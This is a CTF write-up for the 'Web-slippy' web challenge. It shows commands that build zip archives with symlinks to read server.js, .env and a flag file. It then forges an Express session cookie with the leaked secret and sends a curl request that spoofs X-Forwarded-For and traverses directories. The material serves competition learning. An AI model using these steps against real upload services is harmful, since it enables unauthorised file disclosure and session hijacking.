---
title: "TFC CTF Writeup"
date: 2025-09-08T10:00:00Z
tags: ["ZIP Symlink attack", "LFI with file upload", "CTF"]
---

Out of 7 challenges, I have tried out 2 challenges and was able to solve only one challenge. Challenges are bit tricky compated to other CTFs i have played so far.

# Challenge: Web-slippy
This challenge allows user to upload zip files. After cheking the index.js file i found that i need to access `/debug/files`.

<img src="/img/tfcctf_1.png" width="700" height="700" alt="image 1" class="rounded-image">

Here in line 68, user can pass query parameter (session_id) in the url and contents of query parameter will be appended to ../uploads but only allowed from `127.0.0.1` and user should be `develop`.

<img src="/img/tfcctf_2.png" width="700" height="700" alt="image 1" class="rounded-image">

so I need to access `/debug/files` as `develop` user from 127.0.0.1. 

To be `develop` user, I need to get the connect.sid cookie of `develop` user. In the code, develop user info is stored in in-memory datastore as shown below.

<img src="/img/tfcctf_3.png" width="700" height="700" alt="image 1" class="rounded-image">

connect.sid express session value have following format `s:sid:signature`. I need to find sid of the develop user which is redacted in line 24 in the above image and then sign that sid I get a valid connect.sid cookie.

Steps:
 1. Read server.js file to get the sid of develop user.
 2. Read .env file to get the secrte that is used to sign the sid.
 3. Use the `develop` connect.sid cookie to find the flag.

## Read server.js file 
To read server.js file I will upload a zip file which contains a text file but it points to server.js file using symlink. Run below commands to do that.

```bash
touch tfc1.txt
ln -s ../../server.js tfc1.txt
zip archive1.zip tfc1.txt
```
Uploading this zip file, application shows the zip file contents as shown below.

<img src="/img/tfcctf_4.png" width="700" height="700" alt="image 1" class="rounded-image">

If I click on download, it will download server.js file as tfc1.txt is pointing to relative path of server.js.

<img src="/img/tfcctf_5.png" width="700" height="700" alt="image 1" class="rounded-image">

I found the sid of develop  and similary I found the secret key in .env file by uploading zip file from below commands.

```bash
touch tfc2.txt
ln -s ../../.env tfc2.txt
zip archive2.zip tfc2.txt
```
sid -> `amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E`
secret -> `3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b`

now, I need to sign this sid with secret to get a valid session token for `develop` user.

```javascript
const sig=require('cookie-signature'); 
const secret = '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b'
const sid='amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E'; 
console.log('s:' + sig.sign(sid, secret));"

```

I got valid session token to be `develop` user.

## To find flag
Used the develop session token to access /debug/files and flag is stored in a random named directory as specified in the below docker file RUN command.

```bash
FROM node:22-bookworm

WORKDIR /app

COPY src/package*.json ./
RUN npm install

COPY src/ .

EXPOSE 3000

RUN rand_dir="/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"; mkdir "$rand_dir" && echo "TFCCTF{Fake_fLag}" > "$rand_dir/flag.txt" && chmod -R +r "$rand_dir"

CMD ["npm", "start"]
```

I will use directory travesal with the query parameter session_id to find the name of the arbitraory direcory name we curl as below

```bash
set SIGNED=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE

curl -i -H "Cookie: connect.sid=%SIGNED%" -H "X-Forwarded-For: 127.0.0.1" "http://127.0.0.1/debug/files?session_id=../../../../"
```
Found the directory name `tlhedn6f` and to read the flag I uploaded another zip file.

```bash
touch tfc3.txt
ln -s ../../../tlhedn6f/flag.txt tfc3.txt
zip archive3.zip tfc3.txt
```

Upload this archive3.zip file and found the flag `TFCCTF{3at_sl1P_h4Ck_r3p3at_5af9f1}`
